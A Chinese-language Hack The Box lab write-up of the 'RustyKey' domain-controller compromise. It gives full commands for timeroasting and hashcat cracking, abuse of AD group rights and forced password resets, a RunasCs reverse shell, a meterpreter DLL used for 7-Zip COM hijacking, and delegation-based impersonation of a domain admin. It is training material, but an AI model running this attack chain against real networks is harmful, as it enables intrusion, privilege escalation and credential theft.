> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwMzYyNzQ1NA==&mid=2247485717&idx=1&sn=ec7bbd48450cd13ff66269566b76d293

#  HTB RustyKey靶机：域控渗透实战复盘  
原创 红队安全圈  红队安全圈   2025-07-06 13:19  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5HsgFkdwV2IdFhJEZe3xn142fkub0qKjTM1ibSX2c5vSW1phLibySyU3giaJEUGXNbZt8vkFCt6D4qorttBWoOGZQ/640?wx_fmt=gif&from=appmsg "")  
  
hackthebox 第八赛季的新靶机 RustyKey 难度是**Hard**  
，考验了攻击者在域渗透中 timeroasting 攻击的利用、哈希爆破、对受保护对象的理解、COM劫持以及约束委派进行提权，是非常实战的红队靶场，对于攻击者和企业防守方都能从中吸取经验。  
##### 靶机地址  
  
https://app.hackthebox.com/machines/669  
##### 适合读者  
  
√ 红队渗透测试人员  
  
√ 企业安全运维人员  
  
√ CTF竞赛战队  
  
√ 想掌握链式攻击思维的安全从业者  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0RfojK39UjpUrIQMFeJvicI2dTia51PyQ9PsicvDnX32KLAicJJv4IoS4HQ/640?wx_fmt=png&from=appmsg "null")  
  
# 一、信息收集  
### 端口扫描  

```
nmap -sT --min-rate 10000 -p- 10.10.11.75 -oA nmapscan/ports
```

  
从开放的 88 389 636 等端口来看很可能是一台域控机器  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0JJqy6EtPics4SCedc5iagI56xt8Luu7KZQKSgY1Td0nD5jkVsumPYmkg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
扫端口详细信息，得到一个域名
```
rustykey.htb
```

  

```
nmap -sT -Pn -sV -sC -O -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49672,49673,49676,49689,49718 10.10.11.75

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-29 08:31:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2012 (93%), Windows Server 2019 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 1803 (92%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h37m28s
| smb2-time: 
|   date: 2025-06-29T08:32:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

### 人员/机器信息  
  
先同步一下客户端与服务器时间  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp01lhWiblA6Uedo3uM0zZ3uZKPZxibo1unp1HGoPpVfD3lmANhq1qWamfg/640?wx_fmt=png&from=appmsg "null")  
  
  
靶场给了个初始账号
```
rr.parker / 8#t5HE8L!W3A
```

  
，结合上面开放的端口情况，可以尝试 SMB/Winrm/WMI 等协议登录  
  
有报错，并非是账号密码不对，而是协议不支持，域内 SMB 认证默认使用 NTLM 协议，看来是禁用了 NTLM  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0aLSjF2I2HpblvZ50UeTiaGxHu4MPQic6Po443Vw6IQr0criar9lzricRyQ/640?wx_fmt=png&from=appmsg "null")  
  
  
加上 -k 参数使用 kerberos 协议，ldap 认证成功  

```
nxc ldap 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0Nk7fVzSEz1kfRhcc67Ylv7G1XrXRdEcsAgFaoqSt0W6Db7j9n6JHnA/640?wx_fmt=png&from=appmsg "null")  
  
  
继续探测到一些机器名和用户名，其中
```
DC$
```

  
就是当前域控的机器名  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0aDc0Zb1JDexDENJgQO5Fwwb21oEPmwnqHmUhbnXcUPlywkmbRQBkww/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0YoH2sEHkmrrzbHjcK8WJa6jdZosRov1tLjqjKnNBViaNgNMx3BjPuFw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
把他们做成字典，用默认密码喷洒没有发现密码复用  
  
先把域名添加到 hosts  

```
echo '10.10.11.75 rustykey.htb dc.rustykey.htb' >> /etc/hosts
```

> 后续的操作都通过 kerberos 协议，例如 bloodyAD 等工具也有类似的 -k 参数，不再赘述  
  
# 二、漏洞探测  
### timeroasting  

```
bloodhound-ce-python -u rr.parker -p '8#t5HE8L!W3A' -d rustykey.htb -dc dc.rustykey.htb -c all -ns 10.10.11.75 --zip
```

  
导入 bloodhound 分析，当前已知的 rr.parker 用户并没有什么可以直接利用的权限或者横向的条件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0aztLW8PibYkznTeCeNSMRxict1SOH2bhLkzum9JZWVicloLWwBRrgic62w/640?wx_fmt=png&from=appmsg "null")  
  
  
经过不断的翻找资料，发现 timeroasting 这种攻击方式  
> 域内计算机通过MS-SNTP协议与域控制器（DC）同步时间时，请求中包含计算机账户的RID（相对标识符），DC返回的响应数据使用NTLM加密生成消息认证码（MAC）。由于DC不验证请求者身份，攻击者可遍历域内计算机账户的RID，收集这些MAC并离线破解，类似于AS-REP Roasting攻击，Timeroasting是一种隐蔽的离线攻击手段，虽实际利用条件较苛刻，但为攻击者提供了新的攻击面  
  
  
**利用条件：**  
1. 1. 目标域中存在弱密码的计算机账户  
  
1. 2. 攻击者需能访问域内网络或已获取初始立足点，通过工具（如Timeroast脚本）提取哈希  
  
1. 3. 仅针对计算机账户（默认以
```
$
```

  
结尾）  
  
先收集一下哈希，nxc 就可以完成  

```
nxc smb dc.rustykey.htb -M timeroast
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0G8d3FgQDSqbicZFwHxnla7dhhwGWHgX9vPsEniav1wsChxnicMRuQiartA/640?wx_fmt=png&from=appmsg "null")  
  
  
这个 python 项目也可以收集👇  
> https://github.com/SecuraBV/Timeroast?tab=readme-ov-fil  
  
  
然后尝试用 hashcat 离线破解哈希，这里有个坑需要注意，根据找到的资料来看，hashcat 最新的 bate 版才支持上面这种哈希，而 kali 最新版中目前最新的 hashcat 并没有支持 31300，因此需要手动去官网下载 bate 版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0U0Lk4TiberlKfM5HUU5EhKlZia18Cyibic1UBiaiaUsKSVibhXQqpU9ZicBKrQ/640?wx_fmt=png&from=appmsg "null")  
  

```
./hashcat.bin -m 31300 -a 0 ../hashs.txt /usr/share/wordlists/rockyou.txt
```

  
哈希去掉前面的 RID，保留从$开始的部分，指定 31300 模式爆出一个密码：Rusty88!  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0XcOvOibkJcIel83OUrgbZayzPUCbIYibR6afmfibibubhFN8SohbxU4QLg/640?wx_fmt=png&from=appmsg "null")  
  
### 受保护的对象？  
  
这个哈希 rid 是 1125，查看 bloodhound 对应的机器是
```
IT-COMPUTER3
```

  
，机器账号是
```
IT-COMPUTER3$
```

  
，它对 HELPDESK 组有 AddSelf 权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0zjDfHU8ic7lWF5BANvAKMArr2d2sKINwgeXs72XTwxDQF8QFBAsPm4w/640?wx_fmt=png&from=appmsg "null")  
  
  
同时 HELPDESK 对下图四个用户有 ForceChangePassword 权限，对 Protected Objects 组有 AddMember 权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0ticKUOMhSyGoKnvlrtgfmbMrfyZEUiab7hH8jlDvLdic3CHry86QrqsOQ/640?wx_fmt=png&from=appmsg "null")  
  
  
尝试横向到第一个 BB.MORGAN 用户，给他强制改密并登录  

```
# 先把IT-COMPUTER3添加到helpdesk组内
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember HELPDESK 'IT-COMPUTER3$'

# 修改 BB.MORGAN 用户密码
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password BB.MORGAN 'RTCC@123'
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0ibMufLiaYneQLoPW5iaQY8GPIib0xGXIZ2pwSJSuT7trs1XPEYesjC4WoA/640?wx_fmt=png&from=appmsg "null")  
  
  
nxc 验证账号密码是否修改成功，然而报了个错误
```
KDC_ERR_ETYPE_NOSUPP
```

  
，加密方式不支持，可能是使用了强加密类型，禁用了弱加密类型  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0lxpSTgLjy4ak0Cf6rMkDMyGaQO2Pq2AN48Ps7o9VLGWnz2fch7qPHg/640?wx_fmt=png&from=appmsg "null")  
  
  
分析 bloodhound 发现 BB 用户属于 IT 组，IT 组又属于 Protected Objects 组是受保护的对象，安装策略更加严格  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0IIQ4zqLrrU66UBKiblPr9Sia5wqtjmIq55fMMbW9H5YHautmNE1THrvg/640?wx_fmt=png&from=appmsg "null")  
  
  
最简单的方式尝试把 IT 组从受保护的对象中移除，使用 IT-COMPUTER3$ 用户尝试移除成功  

```
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'IT'
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0icOnECxFiabroRCgtt1jictCRibiaT6NBYcfcutG5WFujWlFo606UNXsDbA/640?wx_fmt=png&from=appmsg "null")  
  
  
winrm 无法直接用明文登录，需要获取 TGT 票据，使用 kerberos 认证登录  

```
# 获取tgt票据，在当前目录下生成一个票据文件
impacket-getTGT 'RUSTYKEY.HTB/BB.MORGAN:RTCC@123'

# 添加环境变量
export KRB5CCNAME=BB.MORGAN.ccache

# winrm -r 参数kerberos认证
evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB
```

  
使用 TGT 票据登录成功，在 BB 用户的桌面发现 flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0R6AzL9eG8G5srZwXU9qhjRKfGublCY8SvGWBYgiceFribplBp6R34bog/640?wx_fmt=png&from=appmsg "null")  
  
# 三、权限提升  
### Runas  
  
上一步骤获得 BB 用户的目录下看到一个 PDF 文件， 从里面能看到浓烈的提权信息，包括：  
1. 1. 邮件是 IT 部门发给 support 团队  
  
1. 2. 给 support 团队成员临时添加了一些特殊权限  
  
1. 3. 测试一个压缩/解压软件的上下文菜单功能  
  
1. 4. 需要关注这个软件的注册表，很可能提权条件就在这里  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0U1FT6mMFw5iaJhORzTUe1PVS4YqicCLYBaVEXibd9yox29ibicPFwz3ps6w/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
support 组只有一个用户 EE.REED，前面得知 helpdesk 组对 EE 用户也有强制改密码的权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0ljBoM8MccnzR0BovIeJ7ZBsibV8wtbRlgYAEoemIHJGs9iah5yLVLdcg/640?wx_fmt=png&from=appmsg "null")  
  
  
support 组也属于受保护的对象  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0v8icRT0cOwqxkCPicic50OPr5e1mgTfs6SulwQp7CfKqiaOUlEtYK25KXg/640?wx_fmt=png&from=appmsg "null")  
  
  
因此可以用对 BB 用户一样的操作来对 EE 用户  

```
# 修改密码
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password EE.REED 'RTCC@123'

# 把support组从受保护的对象移除
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'
```

  
测试时获取 EE 用户的 TGT 票据失败，不过没关系，现在已经有远程交互权限，直接上传一个 runascs.exe 工具，以 EE 用户反弹一个 shell 出来  
> runascs.exe 是系统自带 runas 的升级版，可以非交互式直接在把密码作为参数一条命令完成操作，类似的还有 lsrunas.exe、lsrunase.exe 等  
  

```
.\RunasCs.exe ee.reed RTCC@123 cmd.exe -r 10.10.14.98:4445
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0pz2HfKonnjjKaiaiacUwHCS9yBaSnrUtohicxftDJGwyHibukibt0eK3gbw/640?wx_fmt=png&from=appmsg "null")  
  
### COM 劫持  
  
根据前面 PDF 中的线索，在该机器的软件安装目录发现安装了 7zip 压缩软件，线索中还提到了需要关注压缩软件的注册表，因此先查询一下注册表项  

```
reg query HKEY_CLASSES_ROOT\CLSID /f &#34;7-Zip&#34; /s
```

  
看到 7-zip 的 CLSID 以及加载的一个 dll 路径  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0D17CUZLwibGicKGSwhoQibgn4o9D0bHnHmrtNljs0PVJxlOURBCFlw9RQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
上传 accesschk.exe 检测到 support 组对这个注册表有读写权限  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0x58lqxHvo9WXnSxu3jbvNdicRj98RJlrLpibmXa7SIlpXP7HXqiayib8Cg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
MSF 生成一个恶意 dll，上传到目标机器临时目录，攻击机开启监听  

```
# 生成dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.98 LPORT=4444 -f dll -o RTCC.dll

# 开启监听
msfconsole -q -x &#34;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.98; set LPORT 4444; exploit&#34;
```

  
用前面获得的 EE 用户修改注册表为恶意 dll 的路径，如果有人使用了 7zip，就会执行恶意 dll  

```
reg add &#34;HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34; /ve /d &#34;C:\windows\temp\RTCC.dll&#34; /f
```

  
经过一会儿等待后，msf 上线一个 MM.TURNER 用户  
### 约束委派  
  
MM 用户属于 DELEGATIONMANAGER 组，后者对域控有
```
AddAllowedToAct
```

  
权限  
> AddAllowedToAct 是域中的一种权限，允许某个用户或计算机账户配置其他账户的 "允许充当"（AllowedToAct）属性，从而控制Kerberos约束委派的权限，可以修改目标账户的委派设置，使其能代表其他用户访问特定服务，或用于伪造高权限账户（如域管理员）的票据（TGT/TGS），访问敏感资源。AddAllowedToAct 权限滥用可导致权限提升和横向移动，是域渗透中的关键攻击面之一  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2JDksTIzNoQia29xVndYNQp04AUY6GHwtoQosvHjzVMQqUxy89gTXlD85HYFqWKuLeABK6rknB8VnA/640?wx_fmt=png&from=appmsg "null")  
  
  
powershell 命令设置一下约束委派，使
```
IT-COMPUTER3$
```

  
可以冒充域控机器  

```
# 设置域控的约束委派
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount &#34;IT-COMPUTER3$&#34;

# 查询域控的约束委派，关注 PrincipalsAllowedToDelegateToAccount 字段
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0xzZfrCbd8dYsQq5YeU7Gyf4ZkQn3Rw5icxibJaGeEbmliaJvGYCgP32NA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
现在 IT-COMPUTER3$ 可以以 DC 的身份访问一些服务，制作白银票据，申请一张域管 backupadmin 身份的票据去访问文件共享服务器  

```
impacket-getST 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!' -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75
```

  
如下票据请求成功，在当前目录下生成一个
```
.ccache
```

  
票据，添加到环境变量  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0VyUvz1tgkiaPAXlCMpNibjp40SJq7Dgn3icaMia4hk1bRhYicpK4nhRiazsQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
现在使用票据可以去 dump 哈希密码，加上 -no-pass 参数  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0CZ3m1Ao6L0DKkN80xeUJ0o9Qibqg8HwghvslHvyyticvLKEFr76T9Uzw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
或者直接 wmiexec 登录获得域管权限，在 administrator 桌面发现 root flag  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2JDksTIzNoQia29xVndYNQp0KIZqZwAuNG0wfXd7Ozzsu2l41SKnoobevHsxdmbkmgcZ43wHYyJ7IQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
# 企业防守建议  
1. 1. 增强 Kerberos 密码策略，避免使用弱密码  
  
1. 2. 定期审查域用户和组的权限设置  
  
1. 3. 定期更新和维护安全工具和系统  
  
1. 4. 加强员工安全培训，提高识别钓鱼邮件和其他社会工程学攻击的能力  
  
1. 欢迎关注   
红队安全圈  
  
  
  
   
  
  
如果文章对你有帮助，给个一键四连吧  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5HsgFkdwV2J3Ykl5xDepRoqkSBlQKAEIEx0DHiaQHx6sBYGNDAI6Eia2ZnZLLsHzD8yxEGEVbrzzTL4Shrf7iaWWw/640?wx_fmt=gif&from=appmsg "")  
  
